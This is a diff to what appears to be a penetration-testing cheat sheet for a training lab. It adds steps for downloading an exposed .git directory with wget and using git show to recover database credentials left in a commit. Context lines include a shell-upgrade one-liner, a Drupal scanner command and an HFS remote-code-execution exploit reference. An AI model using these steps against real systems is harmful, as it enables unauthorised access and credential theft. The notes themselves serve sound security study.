@@ -236,6 +236,38 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ````
 droopescan scan drupal -u http://10.11.1.50:80
 ````
+###### .git
+````
+sudo wget -r http://192.168.192.144/.git/ #dirb showed a .git folder
+````
+````
+cd 192.168.192.144 #Move into the .git directory localy
+````
+````
+sudo git show #Run a git show command in order to expose more information as below.                                                             
+commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
+Author: Stuart <luke@challenge.pwk>
+Date:   Fri Nov 18 16:58:34 2022 -0500
+
+    Security Update
+
+diff --git a/configuration/database.php b/configuration/database.php
+index 55b1645..8ad08b0 100644
+--- a/configuration/database.php
++++ b/configuration/database.php
+@@ -2,8 +2,9 @@
+ class Database{
+     private $host = "localhost";
+     private $db_name = "staff";
+-    private $username = "stuart@challenge.lab";
+-    private $password = "BreakingBad92";
++    private $username = "";
++    private $password = "";
++// Cleartext creds cannot be added to public repos!
+     public $conn;
+     public function getConnection() {
+         $this->conn = null;
+````
 ##### Exploitation CVEs
 ````
 CVE-2014-6287 https://www.exploit-db.com/exploits/49584 #HFS (HTTP File Server) 2.3.x - Remote Command Execution
